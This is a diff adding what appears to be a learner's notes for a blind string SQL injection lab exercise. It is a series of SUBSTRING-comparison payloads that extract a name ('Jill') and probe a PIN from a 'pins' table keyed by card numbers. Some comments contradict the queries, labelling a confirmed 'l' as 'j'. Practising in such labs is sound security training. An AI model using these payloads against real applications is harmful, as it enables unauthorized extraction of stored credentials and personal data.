@@ -1,0 +1,27 @@
+101 and ((select pin from pins where cc_number = '1111222233334444') <4000)
+
+
+
+<-- sequence of actions in blind string sql injection:
+
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),1,1) < 'z')
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),1,1) < 'Z') <-- is it a capitol letter?, yes
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),1,1) < 'O') <-- yes
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),1,1) < 'F') <-- no
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),1,1) < 'M') <-- yes
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),1,1) > 'I') <-- yes
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),1,1) = 'J') <-- yes, first letter is J
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),2,1) > 'a') <-- yes, second letter is lower case
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),2,1) > 'm') <-- no
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),2,1) < 'h') <-- no, between h and m there is only one vowel, let's try i
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),2,1) = 'i') <-- yes, i is the second letter
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),3,1) > 'm') <-- start with third letter, is not higher than m
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),3,1) > 'd') <-- yes
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),3,1) > 'h') <-- yes
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),3,1) > 'j') <-- yes
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),3,1) = 'l') <-- yes, third letter is j
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),4,1) < 'm') <-- yes
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),4,1) < 'g') <-- no
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),4,1) > 'k') <-- yes
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),4,1) = 'l') <-- yes, forth letter is j
+101 and (SUBSTRING((select name from pins where cc_number = '4321432143214321'),5,1) < 'z') <-- no, so I have finiscìhed, name is Jill.
